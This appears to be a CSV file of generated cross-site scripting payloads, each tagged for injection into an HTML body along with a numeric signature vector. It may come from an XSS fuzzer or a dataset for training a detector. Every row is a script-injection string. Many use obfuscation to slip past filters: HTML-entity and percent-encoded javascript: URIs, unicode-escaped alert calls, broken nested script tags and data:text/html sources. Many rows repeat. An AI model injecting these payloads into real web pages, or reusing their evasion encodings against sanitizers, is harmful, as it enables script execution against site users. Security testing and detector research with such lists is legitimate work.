eval_place,sig_vector,sig_string
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 94]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script>$on."
body_tag,"[41, 232, 54, 231, 131]","src=""data:text/html,<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[41, 232, 54, 231, 131]","src=""data:text/html,<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 138]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script>call."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[186, 232, 54, 231, 131]","""java&NewLine;script:alert(1)""<script>onload=alert();</script></button>"
body_tag,"[186, 232, 54, 231, 138]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>call."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[53, 232, 54, 231, 131]",javascript:al\u0065rt();<script>onload=alert();</script></button>
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[53, 232, 54, 231, 131]",javascript:al\u0065rt();<script>onload=alert();</script></button>
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[195, 232, 54, 231, 131]","""javascript:x='&percnt;27-alert(1)-%27';""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 138]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script>call."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[53, 232, 54, 231, 131]",javascript:al\u0065rt();<script>onload=alert();</script></button>
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 94]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[186, 232, 54, 231, 131]","""java&NewLine;script:alert(1)""<script>onload=alert();</script></button>"
body_tag,"[53, 232, 54, 231, 131]",javascript:al\u0065rt();<script>onload=alert();</script></button>
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 94]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[41, 232, 54, 231, 131]","src=""data:text/html,<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[41, 232, 54, 231, 131]","src=""data:text/html,<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[41, 232, 54, 231, 131]","src=""data:text/html,<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 131]",<script <script>onload=alert();</script></button>
